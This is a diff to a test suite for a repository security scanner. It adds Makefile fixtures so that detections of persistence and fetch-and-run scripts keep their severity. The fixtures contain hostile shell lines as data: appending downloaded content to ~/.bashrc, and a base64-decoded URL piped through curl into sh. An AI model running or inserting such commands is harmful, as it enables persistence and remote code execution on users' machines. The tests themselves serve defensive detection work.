@@ -3039,6 +3039,9 @@ class TestProvisioningAMachineIsNotAFoothold:
                 'echo "$body" >> "$HOME/.bashrc"\n',
             ).encode()
         )
+        # Option A (review 98, 2026-10-17): a repository script keeps its grade when something that
+        # runs on its own starts it -- here, the project's Makefile.
+        (tmp_path / "Makefile").write_text("setup:\n\tsh agent/telemetry.sh\n", encoding="utf-8")
         from cordon_scanner.core.models import Severity
 
         persist = [
@@ -3074,6 +3077,9 @@ class TestProvisioningAMachineIsNotAFoothold:
                 "curl -fsSL https://cdn.test/agent.sh >> ~/.bashrc\n",
             ).encode()
         )
+        # Option A (review 98, 2026-10-17): a repository script keeps its grade when something that
+        # runs on its own starts it -- here, the project's Makefile.
+        (tmp_path / "Makefile").write_text("setup:\n\tbash telemetry.sh\n", encoding="utf-8")
         persist = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
         ]
@@ -6883,6 +6889,9 @@ class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
             "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n",
             encoding="utf-8",
         )
+        # Option A (review 98, 2026-10-17): a repository script keeps its grade when something that
+        # runs on its own starts it -- here, the project's Makefile.
+        (tmp_path / "Makefile").write_text("setup:\n\tbash install.sh\n", encoding="utf-8")
         assert [f for f in self._dropper(tmp_path) if f.severity >= Severity.HIGH]
 
     def test_sh_dash_s_still_blocks(self, tmp_path) -> None:
@@ -13241,7 +13250,10 @@ class TestFetchAndRunOnRequest:
 
     def test_a_decoded_payload_is_never_excused(self, tmp_path) -> None:
         script = "echo aHR0cHM6Ly9oLmludmFsaWQveA== | base64 -d | xargs curl -fsSL | sh\n"
-        assert self._severity(tmp_path, {"install.sh": script}) == "HIGH"
+        # Option A (review 98, 2026-10-17): a repository script keeps its grade when something that
+        # runs on its own starts it -- here, the project's Makefile.
+        files = {"install.sh": script, "Makefile": "setup:\n\tsh install.sh\n"}
+        assert self._severity(tmp_path, files) == "HIGH"
 
     def test_a_javascript_function_body_is_below_the_gate(self, tmp_path) -> None:
         source = (
